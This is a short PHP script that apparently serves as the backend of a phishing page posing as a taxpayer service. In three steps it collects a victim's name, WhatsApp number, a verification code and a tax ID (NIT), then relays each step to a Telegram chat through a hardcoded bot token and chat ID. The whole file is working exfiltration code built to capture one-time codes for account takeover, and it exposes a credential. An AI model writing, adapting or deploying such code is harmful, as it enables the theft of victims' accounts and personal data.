<?php
// Configuración de Telegram
$botToken = "7934864250:AAFc_oLFzrZtTGWa4qqfM_j9xemwhHxp6VE";
$chatId = "6934924977";

// Verificar si se recibió una petición POST
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    
    $fase = $_POST['fase'] ?? '';
    $nombre = htmlspecialchars($_POST['nombre'] ?? 'Sin nombre');
    $mensaje = "";

    // Construcción del mensaje para cada fase
    if ($fase == "1") {
        $whatsapp = htmlspecialchars($_POST['whatsapp'] ?? 'N/A');
        $mensaje = "🟢 <b>NUEVO CLIENTE (Paso 1)</b>\n";
        $mensaje .= "👤 Contribuyente: " . $nombre . "\n";
        $mensaje .= "📱 WhatsApp: " . $whatsapp . "\n";
    } 
    elseif ($fase == "2") {
        $codigo = htmlspecialchars($_POST['codigo'] ?? 'N/A');
        $mensaje = "🟡 <b>CÓDIGO RECIBIDO1 (Paso 2)</b>\n";
        $mensaje .= "👤 Contribuyente: " . $nombre . "\n";
        $mensaje .= "🔑 Código: " . $codigo . "\n";
    }
    elseif ($fase == "3") {
        $nit = htmlspecialchars($_POST['nit'] ?? 'N/A');
        $mensaje = "🔵 <b>CÓDIGO RECIBIDO2 (Paso 3)</b>\n";
        $mensaje .= "👤 Contribuyente: " . $nombre . "\n";
        $mensaje .= "🔑 Código2: " . $nit . "\n";
    }

    // Envío del mensaje
    if ($mensaje != "") {
        $url = "https://api.telegram.org/bot" . $botToken . "/sendMessage";
        
        $datosEnvio = [
            'chat_id' => $chatId,
            'text' => $mensaje,
            'parse_mode' => 'HTML'
        ];

        // Usamos http_build_query para codificar automáticamente el contenido en UTF-8 y URL-safe
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($datosEnvio));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        
        $respuesta = curl_exec($ch);
        $error = curl_error($ch);
        curl_close($ch);
        
        if ($error) {
            echo json_encode(["status" => "error", "message" => $error]);
        } else {
            echo json_encode(["status" => "success", "telegram_response" => $respuesta]);
        }
    } else {
        echo json_encode(["status" => "error", "message" => "Datos incompletos"]);
    }
}
?>